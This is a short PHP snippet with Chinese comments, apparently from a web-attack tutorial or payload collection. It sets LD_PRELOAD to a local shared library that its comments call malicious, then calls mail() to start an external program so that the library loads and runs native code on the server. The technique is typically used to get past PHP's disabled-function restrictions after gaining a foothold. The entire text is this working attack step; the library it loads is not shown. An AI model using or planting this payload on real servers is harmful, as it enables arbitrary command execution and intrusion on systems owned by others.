<?php
putenv("LD_PRELOAD=./demo.so");// 设置环境变量，预加载恶意库
mail('','','','');             // 触发外部程序执行
?>